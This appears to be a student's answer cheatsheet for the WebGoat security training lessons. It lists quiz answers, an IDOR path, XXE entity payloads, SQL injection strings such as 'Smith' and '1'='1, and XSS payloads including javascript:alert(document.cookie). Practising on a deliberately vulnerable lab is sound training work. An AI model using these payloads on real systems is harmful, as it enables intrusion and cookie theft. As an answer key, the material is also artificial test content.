# Cheatsheet

https://github.com/WebGoat/WebGoat/wiki/Main-Exploits

## CIA TRIAD
[Descripción de CIAD](https://www.forcepoint.com/es/cyber-edu/cia-triad)

1- Solution 3: By stealing a database where names and emails are stored and uploading it to a website.
2- Solution 1: By changing the names and emails of one or more users stored in a database.
3- Solution 4: By launching a denial of service attack on the servers.
4- Solution 2: The systems security is compromised even if only one goal is harmed.

## Crypto basics

### 2

[Encoding](https://www.w3.org/International/questions/qa-what-is-encoding)
[Encode64](https://www.base64decode.org/)

### 3

[XOR IBM](https://strelitzia.net/wasXORdecoder/wasXORdecoder.html)

`databasepassword`

### 4

[MD5](https://www.md5online.org/md5-decrypt.html)
[SHA256](https://hashes.com/es/decrypt/hash)

### 5
Symmetric - Misma llave
-  Is an older method of encryption, it is faster and more efficient than asymmetric encryption, which takes a toll on networks due to performance issues with data size and heavy CPU use.
-  Is typically used for bulk encryption / encrypting large amounts of data, e.g. for database encryption. In the case of a database, the secret key might only be available to the database itself to encrypt or decrypt.


 Asymmetric - llave publica llave privada

## Access control flaws -  Guessing & Predicting Patterns

```
WebGoat/IDOR/profile/2342384
```

## XXE - Let's try

```xml
<?xml version="1.0" encoding='UTF-8'?>
<!DOCTYPE comment [
  <!ELEMENT comment (Activity)>
  <!ELEMENT Activity (#PCDATA)>
  <!ENTITY xxe SYSTEM "..">
]>
```
## Modern REST framework

```xml
<?xml version="1.0" encoding='UTF-8'?>
<!DOCTYPE comment [
  <!ELEMENT comment (Activity)>
  <!ELEMENT Activity (#PCDATA)>
  <!ENTITY xxe SYSTEM "..">
]>
<comment><text>&xxe;</text></comment>
```

## Try It! String SQL Injection

```
Smith' and '1'='1
```

## Try It! Numeric SQL Injection

```
101 OR TRUE
```

## SQL Injection (mitigation) - ZAP

```
192.168.6.4
```

## Authentication Bypasses - ZAP

```
secQuestion00=asd&secQuestion01=asd
```

## What is XSS

```
yes / no 
```

```
javascript:alert(document.cookie);
```

## Try It! Reflected XSS

Enter your credit card number:
```
<script>alert('my javascript here')</script>
```
## Identify Potential for DOM-Based XSS

```
start.mvc#test/
```

## Try It! DOM-Based XSS

Consola:
```
webgoat.customjs.phoneHome()
```
